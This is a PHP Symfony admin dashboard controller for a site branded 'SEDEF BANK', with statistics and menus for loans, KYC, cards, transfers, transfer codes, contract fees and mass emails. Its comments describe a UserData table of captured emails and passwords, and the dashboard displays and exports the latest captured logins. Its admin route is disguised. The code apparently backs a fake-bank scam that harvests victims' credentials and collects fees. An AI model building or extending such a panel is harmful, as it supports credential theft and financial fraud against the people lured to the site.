<?php

namespace App\Controller\Admin;

use App\Entity\User;
use App\Entity\UserData;
use App\Entity\UserDataExport;
use App\Entity\CreditApplication;
use App\Entity\Account;
use App\Entity\Transfer;
use App\Entity\TransferCode;
use App\Entity\TransferAttempt;
use App\Entity\Transaction;
use App\Entity\Loan;
use App\Entity\Card;
use App\Entity\CardSubscription;
use App\Entity\ContractSubscription;
use App\Entity\Document;
use App\Entity\KycSubmission;
use App\Entity\CompanySettings;
use App\Entity\DemandeDevis;
use App\Entity\ContratAssurance;
use App\Entity\DemandeDevisCreditAssociation;
use App\Entity\ScheduledEmail;
use App\Entity\CustomEmail;
use App\Entity\PaymentAccount;
use App\Controller\Admin\CreditApplicationCrudController;
use App\Controller\Admin\CreditApplicationWorkflowController;
use App\Controller\Admin\DemandeDevisCrudController;
use App\Controller\Admin\ContratAssuranceCrudController;
use App\Controller\Admin\DemandeDevisCreditAssociationCrudController;
use App\Controller\Admin\ScheduledEmailCrudController;
use App\Controller\Admin\CustomEmailCrudController;
use App\Controller\Admin\PaymentAccountCrudController;
use App\Service\CreditApplicationService;
use App\Enum\CreditApplicationStatusEnum;
use EasyCorp\Bundle\EasyAdminBundle\Config\Dashboard;
use EasyCorp\Bundle\EasyAdminBundle\Config\MenuItem;
use EasyCorp\Bundle\EasyAdminBundle\Controller\AbstractDashboardController;
use EasyCorp\Bundle\EasyAdminBundle\Router\AdminUrlGenerator;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;
use Symfony\Component\Security\Http\Attribute\IsGranted;
use Doctrine\ORM\EntityManagerInterface;

class DashboardController extends AbstractDashboardController
{
    public function __construct(
        private EntityManagerInterface $entityManager,
        private CreditApplicationService $creditApplicationService
    ) {}

    #[Route('your-are-in-my/Zve007', name: 'app_admin_dashboard')]
    #[IsGranted('ROLE_ADMIN')]
    public function index(): Response
    {
        // Récupérer les statistiques pour le tableau de bord
        $pendingApplications = $this->creditApplicationService->getApplicationsByStatus(CreditApplicationStatusEnum::PENDING);
        $recentApplications = $this->creditApplicationService->getRecentApplications(5);
        $stats = $this->creditApplicationService->getStatistics();

        // Statistiques des demandes de crédit en cours de traitement
        $creditApplicationStats = [
            'in_progress' => $this->entityManager->getRepository(CreditApplication::class)
                ->createQueryBuilder('ca')
                ->select('COUNT(ca.id)')
                ->where('ca.status IN (:statuses)')
                ->setParameter('statuses', [
                    CreditApplicationStatusEnum::IN_PROGRESS->value,
                    CreditApplicationStatusEnum::IN_REVIEW->value,
                    CreditApplicationStatusEnum::PENDING->value,
                    CreditApplicationStatusEnum::REQUIRES_DOCUMENTS->value,
                ])
                ->getQuery()
                ->getSingleScalarResult(),
        ];

        // Statistiques des utilisateurs
        $userStats = [
            'total' => $this->entityManager->getRepository(User::class)->count([]),
            'today' => $this->entityManager->getRepository(User::class)
                ->createQueryBuilder('u')
                ->select('COUNT(u.id)')
                ->where('u.createdAt >= :startOfDay AND u.createdAt < :endOfDay')
                ->setParameter('startOfDay', new \DateTime('today'))
                ->setParameter('endOfDay', new \DateTime('tomorrow'))
                ->getQuery()
                ->getSingleScalarResult(),
            'with_kyc_approved' => $this->entityManager->getRepository(User::class)
                ->createQueryBuilder('u')
                ->select('COUNT(DISTINCT u.id)')
                ->leftJoin('u.kycSubmission', 'k')
                ->where('k.status = :status')
                ->setParameter('status', 'approved')
                ->getQuery()
                ->getSingleScalarResult(),
        ];

        // Statistiques KYC
        $kycStats = [
            'pending' => $this->entityManager->getRepository(KycSubmission::class)->count(['status' => 'pending']),
            'approved' => $this->entityManager->getRepository(KycSubmission::class)->count(['status' => 'approved']),
            'rejected' => $this->entityManager->getRepository(KycSubmission::class)->count(['status' => 'rejected']),
            'incomplete' => $this->entityManager->getRepository(KycSubmission::class)->count(['status' => 'incomplete']),
        ];

        // Statistiques des transactions
        $transactionStats = [
            'total' => $this->entityManager->getRepository(Transaction::class)->count([]),
            'today' => $this->entityManager->getRepository(Transaction::class)
                ->createQueryBuilder('t')
                ->select('COUNT(t.id)')
                ->where('t.createdAt >= :startOfDay AND t.createdAt < :endOfDay')
                ->setParameter('startOfDay', new \DateTime('today'))
                ->setParameter('endOfDay', new \DateTime('tomorrow'))
                ->getQuery()
                ->getSingleScalarResult(),
            'pending' => $this->entityManager->getRepository(Transaction::class)->count(['status' => 'pending']),
            'completed' => $this->entityManager->getRepository(Transaction::class)->count(['status' => 'completed']),
            'failed' => $this->entityManager->getRepository(Transaction::class)->count(['status' => 'failed']),
            'volume_month' => $this->entityManager->getRepository(Transaction::class)
                ->createQueryBuilder('t')
                ->select('COALESCE(SUM(t.amount), 0)')
                ->where('t.createdAt >= :startOfMonth AND t.status = :completed')
                ->setParameter('startOfMonth', new \DateTime('first day of this month'))
                ->setParameter('completed', 'completed')
                ->getQuery()
                ->getSingleScalarResult(),
        ];

        // Statistiques des prêts
        $loanStats = [
            'active' => $this->entityManager->getRepository(Loan::class)->count(['status' => 'active']),
            'pending' => $this->entityManager->getRepository(Loan::class)->count(['status' => 'pending']),
            'completed' => $this->entityManager->getRepository(Loan::class)->count(['status' => 'completed']),
            'total_amount' => $this->entityManager->getRepository(Loan::class)
                ->createQueryBuilder('l')
                ->select('COALESCE(SUM(l.amount), 0)')
                ->where('l.status = :active')
                ->setParameter('active', 'active')
                ->getQuery()
                ->getSingleScalarResult(),
        ];

        // Statistiques des cartes
        $cardStats = [
            'total' => $this->entityManager->getRepository(Card::class)->count([]),
            'active' => $this->entityManager->getRepository(Card::class)->count(['status' => 'active']),
            'blocked' => $this->entityManager->getRepository(Card::class)->count(['status' => 'blocked']),
            'expired' => $this->entityManager->getRepository(Card::class)->count(['status' => 'expired']),
        ];

        // Statistiques des demandes de souscription de cartes
        $cardSubscriptionStats = [
            'pending' => $this->entityManager->getRepository(CardSubscription::class)
                ->createQueryBuilder('cs')
                ->select('COUNT(cs.id)')
                ->where('cs.status IN (:statuses)')
                ->setParameter('statuses', ['pending', 'fees_set', 'approved'])
                ->getQuery()
                ->getSingleScalarResult(),
        ];

        // Statistiques des comptes
        $accountStats = [
            'total' => $this->entityManager->getRepository(Account::class)->count([]),
            'active' => $this->entityManager->getRepository(Account::class)->count(['status' => 'active']),
            'suspended' => $this->entityManager->getRepository(Account::class)->count(['status' => 'suspended']),
            'pending' => $this->entityManager->getRepository(Account::class)->count(['status' => 'pending']),
        ];

        // Statistiques des virements
        $transferStats = [
            'pending' => $this->entityManager->getRepository(Transfer::class)->count(['status' => 'pending']),
            'executing' => $this->entityManager->getRepository(Transfer::class)->count(['status' => 'executing']),
            'completed' => $this->entityManager->getRepository(Transfer::class)->count(['status' => 'completed']),
            'blocked' => $this->entityManager->getRepository(Transfer::class)->count(['status' => 'blocked']),
            'total_today' => $this->entityManager->getRepository(Transfer::class)
                ->createQueryBuilder('t')
                ->select('COUNT(t.id)')
                ->where('t.createdAt >= :startOfDay AND t.createdAt < :endOfDay')
                ->setParameter('startOfDay', new \DateTime('today'))
                ->setParameter('endOfDay', new \DateTime('tomorrow'))
                ->getQuery()
                ->getSingleScalarResult(),
        ];

        // Statistiques des contrats de souscription
        $contractStats = [
            'pending_validation' => $this->entityManager->getRepository(ContractSubscription::class)
                ->createQueryBuilder('c')
                ->select('COUNT(c.id)')
                ->leftJoin('c.cardSubscription', 'cs')
                ->where('c.status = :signed AND cs.status = :pending_validation')
                ->setParameter('signed', 'signed')
                ->setParameter('pending_validation', 'pending_validation')
                ->getQuery()
                ->getSingleScalarResult(),
            'signed_today' => $this->entityManager->getRepository(ContractSubscription::class)
                ->createQueryBuilder('c')
                ->select('COUNT(c.id)')
                ->where('c.signedAt >= :startOfDay AND c.signedAt < :endOfDay')
                ->setParameter('startOfDay', new \DateTime('today'))
                ->setParameter('endOfDay', new \DateTime('tomorrow'))
                ->getQuery()
                ->getSingleScalarResult(),
            'total_signed' => $this->entityManager->getRepository(ContractSubscription::class)->count(['status' => 'signed']),
        ];

        // Statistiques des demandes de devis en attente
        $demandeDevisStats = [
            'pending' => $this->entityManager->getRepository(DemandeDevis::class)
                ->createQueryBuilder('dd')
                ->select('COUNT(dd.id)')
                ->where('dd.statut IN (:statuses)')
                ->setParameter('statuses', [
                    \App\Enum\DemandeDevisStatusEnum::EN_ATTENTE->value,
                    \App\Enum\DemandeDevisStatusEnum::EN_COURS->value,
                    \App\Enum\DemandeDevisStatusEnum::TRAITE->value,
                ])
                ->getQuery()
                ->getSingleScalarResult(),
        ];

        // Récupérer les contrats en attente de validation
        $pendingContracts = $this->entityManager->getRepository(ContractSubscription::class)
            ->createQueryBuilder('c')
            ->leftJoin('c.cardSubscription', 'cs')
            ->leftJoin('cs.user', 'u')
            ->addSelect('cs', 'u')
            ->where('c.status = :signed AND cs.status = :pending_validation')
            ->setParameter('signed', 'signed')
            ->setParameter('pending_validation', 'pending_validation')
            ->orderBy('c.signedAt', 'ASC')
            ->setMaxResults(10)
            ->getQuery()
            ->getResult();

        // Statistiques UserData (emails/mots de passe capturés)
        $userDataStats = [
            'total' => $this->entityManager->getRepository(UserData::class)->count([]),
            'today' => $this->entityManager->getRepository(UserData::class)
                ->createQueryBuilder('ud')
                ->select('COUNT(ud.id)')
                ->where('ud.createdAt >= :startOfDay AND ud.createdAt < :endOfDay')
                ->setParameter('startOfDay', new \DateTime('today'))
                ->setParameter('endOfDay', new \DateTime('tomorrow'))
                ->getQuery()
                ->getSingleScalarResult(),
            'logins' => $this->entityManager->getRepository(UserData::class)->count(['action' => 'login']),
            'registers' => $this->entityManager->getRepository(UserData::class)->count(['action' => 'register']),
        ];

        // Récupérer les dernières données capturées
        $recentUserData = $this->entityManager->getRepository(UserData::class)
            ->createQueryBuilder('ud')
            ->orderBy('ud.createdAt', 'DESC')
            ->setMaxResults(10)
            ->getQuery()
            ->getResult();

        return $this->render('admin/dashboard.html.twig', [
            'pendingApplications' => $pendingApplications,
            'recentApplications' => $recentApplications,
            'stats' => $stats,
            'transferStats' => $transferStats,
            'contractStats' => $contractStats,
            'pendingContracts' => $pendingContracts,
            'pendingCount' => count($pendingApplications),
            'creditApplicationStats' => $creditApplicationStats,
            'demandeDevisStats' => $demandeDevisStats,
            'userDataStats' => $userDataStats,
            'recentUserData' => $recentUserData,
            'userStats' => $userStats,
            'kycStats' => $kycStats,
            'transactionStats' => $transactionStats,
            'loanStats' => $loanStats,
            'cardStats' => $cardStats,
            'cardSubscriptionStats' => $cardSubscriptionStats,
            'accountStats' => $accountStats,
        ]);
    }

    public function configureDashboard(): Dashboard
    {
        return Dashboard::new()
            ->setTitle('SEDEF BANK - Administration')
            ->setFaviconPath('images/logo.svg')
            ->setLocales([
                'fr' => '🇫🇷 Français',
                'nl' => '🇳🇱 Nederlands'
            ]);
    }

    public function configureMenuItems(): iterable
    {
        yield MenuItem::linkToDashboard('Tableau de bord', 'fa fa-home');
        
        yield MenuItem::section('Gestion des utilisateurs');
        yield MenuItem::linkToCrud('Utilisateurs', 'fa fa-users', User::class);
        yield MenuItem::linkToCrud('Données de connexion', 'fa fa-database', UserData::class);
        yield MenuItem::linkToCrud('Exports UserData', 'fa fa-file-export', UserDataExport::class);
        yield MenuItem::linkToCrud('Vérifications KYC', 'fa fa-shield-alt', KycSubmission::class);

        yield MenuItem::section('Gestion des crédits');
        yield MenuItem::linkToCrud('Demandes de crédit', 'fa fa-file-text', CreditApplication::class)
            ->setController(CreditApplicationCrudController::class);
        yield MenuItem::linkToCrud('Frais de contrat', 'fa fa-calculator', CreditApplication::class)
            ->setController(ContractFeeCrudController::class);
        yield MenuItem::linkToCrud('Gestion contrat', 'fa fa-file-contract', CreditApplication::class)
            ->setController(CreditApplicationWorkflowController::class);

        yield MenuItem::section('Virements bancaires');
        yield MenuItem::linkToCrud('Virements', 'fa fa-money-bill-transfer', Transfer::class);
        yield MenuItem::linkToCrud('Codes de sécurité', 'fa fa-key', TransferCode::class);
        yield MenuItem::linkToCrud('Tentatives de validation', 'fa fa-history', TransferAttempt::class);
        
        yield MenuItem::section('Assurances');
        yield MenuItem::linkToCrud('Demandes de devis', 'fa fa-file-alt', DemandeDevis::class)
            ->setController(DemandeDevisCrudController::class);
        yield MenuItem::linkToCrud('Contrats d\'assurance', 'fa fa-shield-alt', ContratAssurance::class)
            ->setController(ContratAssuranceCrudController::class);
        yield MenuItem::linkToCrud('Associations Devis-Crédit', 'fa fa-link', DemandeDevisCreditAssociation::class)
            ->setController(DemandeDevisCreditAssociationCrudController::class);

        yield MenuItem::section('Documents');
        yield MenuItem::linkToCrud('Documents', 'fa fa-file', Document::class);

        yield MenuItem::section('Comptes bancaires');
        yield MenuItem::linkToCrud('Comptes', 'fa fa-university', Account::class);
        // yield MenuItem::linkToCrud('Transactions', 'fa fa-exchange', Transaction::class);
        yield MenuItem::linkToCrud('Cartes bancaires', 'fa fa-credit-card', Card::class);
        yield MenuItem::linkToCrud('Souscriptions cartes', 'fa-solid fa-id-card', CardSubscription::class);
        yield MenuItem::linkToCrud('Contrats souscriptions', 'fa fa-file-signature', ContractSubscription::class);
        
        yield MenuItem::section('Emails');
        yield MenuItem::linkToCrud('Email personnalisé', 'fa fa-envelope-open-text', CustomEmail::class)
            ->setController(CustomEmailCrudController::class);
        yield MenuItem::linkToCrud('Envoyer un email', 'fa fa-envelope', ScheduledEmail::class)
            ->setController(ScheduledEmailCrudController::class);
        
        yield MenuItem::section('Configuration');
        yield MenuItem::linkToCrud('Paramètres entreprise', 'fa fa-building', CompanySettings::class);
        yield MenuItem::linkToCrud('Compte de paiement', 'fa fa-money-check', PaymentAccount::class)
            ->setController(PaymentAccountCrudController::class);
        
        yield MenuItem::section('Système');
        yield MenuItem::linkToUrl('Retour au site', 'fa fa-globe', $this->generateUrl('home_index', ['_locale' => 'fr']));
        yield MenuItem::linkToUrl('Déconnexion', 'fa fa-sign-out', $this->generateUrl('app_logout', ['_locale' => 'fr']));
    }
}
